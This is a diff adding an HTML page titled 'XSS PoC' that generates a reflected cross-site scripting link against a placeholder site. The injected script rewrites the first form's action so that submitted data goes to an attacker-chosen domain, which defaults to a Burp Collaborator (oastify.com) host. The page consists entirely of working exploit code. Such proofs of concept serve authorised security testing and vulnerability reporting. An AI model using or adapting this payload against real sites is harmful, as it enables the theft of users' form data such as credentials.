@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS PoC</title>
+  <script>
+    function generateRandomString(length) {
+      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function buildPoC() {
+      // Get the domain from the input field
+      const customDomain = document.getElementById('domainInput').value;
+      if (!customDomain) {
+        alert('Please enter a domain.');
+        return;
+      }
+
+      const randomStr = generateRandomString(10);
+      
+      // Insert the custom domain into the payload
+      const xssPayload = `${randomStr}"><script>document.forms[0].action='https://${customDomain}/'<\/script>bar`;
+      
+      const encodedPayload = encodeURIComponent(xssPayload);
+      const pocUrl = `https://vulnerable-site.com/?id=${encodedPayload}`;
+
+      const link = document.getElementById('xss-link');
+      link.href = pocUrl;
+      link.textContent = 'Click here to trigger XSS PoC';
+      link.style.display = 'inline'; // Make the link visible
+    }
+  </script>
+</head>
+<body>
+  <h2>Reflected Cross-Site Scripting PoC</h2>
+  
+  <div>
+    <label for="domainInput"><strong>Enter Domain:</strong></label>
+    <input type="text" id="domainInput" placeholder="your-domain.com" value="4fktalf12qrmitusobgadznzhqnhb85wu.oastify.com" size="50">
+  </div>
+  
+  <br>
+
+  <div>
+    <button onclick="buildPoC()">Generate PoC Link</button>
+  </div>
+  
+  <br>
+  
+  <a id="xss-link" target="_blank" style="display:none;"></a>
+
+</body>
+</html>
